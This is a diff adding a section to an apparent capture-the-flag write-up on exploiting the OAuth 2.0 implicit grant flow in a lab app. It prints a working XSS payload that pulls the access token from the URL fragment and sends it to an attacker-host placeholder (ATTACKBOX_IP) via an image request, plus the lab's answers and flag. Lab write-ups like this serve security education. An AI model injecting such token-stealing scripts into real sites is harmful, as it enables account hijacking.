@@ -215,5 +215,48 @@ This vulnerability results from the `state` parameter's missing fron the URL. As
 
 `-> state`
 
+## Exploit OAuth - Implicit Grant Flow
+### Attacking Machine
+- Visit the URL `http://factbok.thm:8080` & click the "Sync statuses from CoffeeShopApp" button
+
+  ![image](https://github.com/user-attachments/assets/f86e8b91-b181-4257-a014-2ce189fb971a)
+
+- Log in the **CoffeeShopApp** with the credentials **`victim:victim123`**
+
+![image](https://github.com/user-attachments/assets/77f4ebdc-bbee-4f36-bbcd-b68ec51f28e8)
+
+- On this page, we see there's an input field, which is intentionally designed to be vulnerable to XSS.
+- Create a script to retrieve the token from the victims: `script.js`
+
+```javascript
+<script>var hash = window.location.hash.substr(1);var result = hash.split('&').reduce(function (res, item) {var parts = item.split('=');res[parts[0]] = parts[1];
+    return res;
+  }, {});
+  var accessToken = result.access_token;
+    var img = new Image();
+    img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;
+</script>
+```
+- Set up a HTTP server: `python3 -m http.server 8081`
+
+### Victim Machine
+- Inject the script into the above input field. Remember to modify the **ATTACKBOX_IP**
+- Refresh the page once the script is successfully injected
+
+  ![image](https://github.com/user-attachments/assets/913fac5c-7096-412a-920a-109555efb134)
+
+- We should get the victim's token on the ATTACKBOX's terminal.
+
+   ![image](https://github.com/user-attachments/assets/0da47354-5b78-4016-8a17-b376b2ba2bd1)
+
+- Use it to validate agaisnt the flag validation server to retrieve the flag
+
+**- What symbol separates the access token from the OAuth 2.0 implicit grant flow URL?**
+
+`-> #`
+
+**- Visit the URL http://coffee.thm:8080/flagvalidator/ and enter the access token you acquired. What is the flag value?**
+
+`-> THM{TOKEN_HACKED}`
 
 
